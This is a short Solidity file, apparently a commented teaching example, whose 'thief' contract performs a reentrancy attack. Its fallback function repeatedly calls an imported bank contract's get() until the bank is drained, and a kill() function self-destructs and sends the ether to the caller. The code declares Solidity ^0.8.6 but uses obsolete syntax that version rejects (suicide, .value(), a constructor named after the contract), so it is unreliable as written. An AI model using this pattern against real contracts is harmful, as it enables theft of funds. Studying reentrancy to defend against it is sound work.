//the attacker
pragma solidity ^0.8.6;

import "./bank.sol"; //import the bank contract that is in separate file


contract thief { //bank is referenced throughout the thief contract
    bank public Bank;

function thief (address _Bank) { //pass the bank contract address to constructor function that is called when the thief is created
    Bank = bank(_Bank);
}

//withdraw ether from bank contract to thief so need to collect to my own address
function kill () { //this function destroy the thief and send the ether to address that call kill function
    suicide(msg.sender);
}
//put some ether in bank and after gets it
function collect() payable { //payable here tells the ETM that it permits to receive ether
    Bank.put.value(msg.value)();
    Bank.get();
}

function () payable { //fallback function is called whenever the hief contracts receive ether
    if (Bank.balance >= msg.value) { //if bank contract balance is more than the value that it was sent to the fallback function calls get() function once again starting a cycle 
        Bank.get();
    }

//this make that contract send monet to thief address until bank is depleted


}

}